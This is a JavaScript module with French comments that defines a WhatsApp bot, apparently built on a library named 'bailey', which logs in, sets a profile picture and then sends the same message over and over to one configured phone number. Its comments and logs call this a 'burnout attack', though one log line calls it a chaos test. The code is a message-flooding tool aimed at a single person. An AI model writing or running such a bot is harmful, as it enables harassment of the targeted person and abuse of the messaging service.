const Bailey = require('bailey');
const fs = require('fs');
const { createLogger, transports, format } = require('winston');
const config = require('../config/config');

class WhatsAppBurnoutBailey {
  constructor() {
    this.client = new Bailey();
    this.logger = createLogger({
      level: 'info',
      format: format.combine(
        format.timestamp(),
        format.printf(({ timestamp, message }) => `${timestamp} ${message}`)
      ),
      transports: [
        new transports.Console(),
        new transports.File({ filename: config.logFile })
      ]
    });
  }

  // Méthode pour initialiser le client Bailey
  async initializeClient() {
    try {
      // Initialisation de Bailey et connexion à WhatsApp Web
      await this.client.initialize();
      this.logger.info('Bailey est prêt à envoyer des messages.');
      await this.setProfilePic();  // Ajouter cette fonction pour définir la photo de profil
      this.startBurnoutAttack();
    } catch (error) {
      this.logger.error('Erreur lors de l\'initialisation de Bailey:', error);
    }
  }

  // Fonction pour définir l'image de profil du bot
  async setProfilePic() {
    try {
      const profilePicPath = './media/botProfilePic.jpg'; // Chemin de l'image
      const imageBuffer = fs.readFileSync(profilePicPath);
      await this.client.setProfilePicture(imageBuffer);  // Si Bailey le permet
      this.logger.info('Image de profil mise à jour');
    } catch (error) {
      this.logger.error('Erreur lors de la mise à jour de l\'image de profil:', error);
    }
  }

  // Envoi des messages en masse
  async sendMessage(targetPhoneNumber) {
    try {
      const message = 'Test de Burnout WhatsApp avec Bailey';
      await this.client.sendMessage(targetPhoneNumber, message);
      this.logger.info(`Message envoyé à ${targetPhoneNumber}`);
    } catch (error) {
      this.logger.error('Erreur lors de l\'envoi du message:', error);
    }
  }

  // Lancer l'attaque de burnout
  async startBurnoutAttack() {
    this.logger.info(`Démarrage de l'attaque de Burnout sur WhatsApp pour ${config.targetPhoneNumber}`);
    for (let i = 0; i < config.messageCount; i++) {
      await this.sendMessage(config.targetPhoneNumber);
    }
  }

  // Exécution de l'attaque
  async execute() {
    this.logger.info('Démarrage du bot de test de chaos WhatsApp');
    await this.initializeClient();
  }
}

module.exports = WhatsAppBurnoutBailey;
